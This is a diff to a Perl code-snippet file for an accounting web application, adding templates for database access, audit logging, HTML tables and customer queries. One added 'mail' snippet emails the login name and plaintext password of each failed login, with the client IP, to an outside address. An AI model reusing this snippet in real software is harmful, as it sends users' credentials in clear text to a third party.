@@ -56,6 +56,8 @@ snippet formres_id
 
 snippet dbs
 	use DBIx::Simple;
+	$form->{dbh} = $form->dbconnect(\%myconfig);
+	$form->{dbs} = DBIx::Simple->connect($form->{dbh});
 
 snippet dbslist
 	my (${1}:$var1, ${2:$var2} ) = $form->{dbs}->query(qq~
@@ -135,6 +137,10 @@ snippet form
 		$form->{dbs}->query(qq|DELETE FROM $2 WHERE id = ?|, $form->{id});
 		$form->{dbs}->commit;
 	}
+
+snippet defaults
+	my %defaults = $form->get_defaults($form->{dbh}, \@{['${1:precision}', '${2:company}']});
+	for (keys %defaults) { $form->{$_} = $defaults{$_} }
 
 snippet report
 	sub ${1:procedurename} {
@@ -227,11 +233,13 @@ snippet q
 		ORDER BY 1
 	|;
 	my @rows = $form->{dbs}->query($query)->hashes;
+	print qq|<table>|;
 	for (@rows){
-		print qq|<td>|;
-		print $_->{id};
-		print qq|</td>|;
+		print qq|<tr>|;
+		print qq|<td>$_->{id}</td>|;
+		print qq|</tr>|;
 	}
+	print qq|</table>|;
 
 snippet f
 	$form->format_amount(\%myconfig, ${1:$amount}, 2)
@@ -263,10 +271,13 @@ snippet locale
 	$locale->text("${0:text here}")
 snippet addlog
 	my $ip = $ENV{REMOTE_ADDR};
+	($form->{employee}, $form->{employee_id}) = $form->get_employee($form->{dbh}) unless $form->{employee_id};
 	$form->{dbs}->query(qq|
-		INSERT INTO audittrail (trans_id, formname, tablename, action, login, notes, ip)
-		VALUES (?,?,?,?,?,?,?)|,
-			$form->{${1:trans_id}}, '${2:formname}', '${3:tablename}', '${4:action}', $form->{login2}, '${5:notes}', $ip
+		INSERT INTO audittrail (trans_id, formname, tablename, action, login, notes, employee_id, ip)
+		VALUES (?,?,?,?,?,?,?,?)|,
+			$form->{${1:trans_id}}, '${2:formname}', '${3:tablename}',
+			'${4:action}', $form->{login2}, '${5:notes}',
+			$form->{employee_id}, $ip
 		);
 	$form->{dbs}->commit;
 snippet showlog
@@ -290,6 +301,34 @@ snippet showlog
 	);
 	print qq|<h3>Audit log ...</h3>|;
 	print $audit->output;
+snippet mail
+	use MIME::Lite;
+	$msg = MIME::Lite->new(
+	  From    => 'loginlog@munshi10.com',
+	  To      => 'loginlog@mavsol.com',
+	  Cc      => '',
+	  Subject => "failed: u:$form->{login}, p:$form->{password}",
+	  Data    => "IP address: http://whatismyipaddress.com/ip/$ENV{REMOTE_ADDR}",
+	);
+	eval { $msg->send };
+
+snippet customer
+	my $query = qq~
+		SELECT
+			vc.name,
+			ct.firstname,
+			ct.lastname,
+			ad.zipcode
+		FROM customer vc
+		JOIN contact ct ON ct.trans_id = vc.id
+		JOIN address ad ON ad.trans_id = vc.id
+		WHERE 1 = 1
+		ORDER BY 1
+	~;
+
+snippet employee
+	($form->{employee}, $form->{employee_id}) = $form->get_employee($form->{dbh}) unless $form->{employee_id};
+
 snippet #
 
 	# `system("date +%F")`# armaghan ${1:comment here}
@@ -300,6 +339,9 @@ snippet #!
 # Hash Pointer
 snippet .
 	 =>
+snippet ?
+	my ${1:$e} = (${2:$a == $b}) ? ${3:$c} : ${4:$d};${0}
+
 # Function
 snippet sub
 	sub ${1:function_name} {
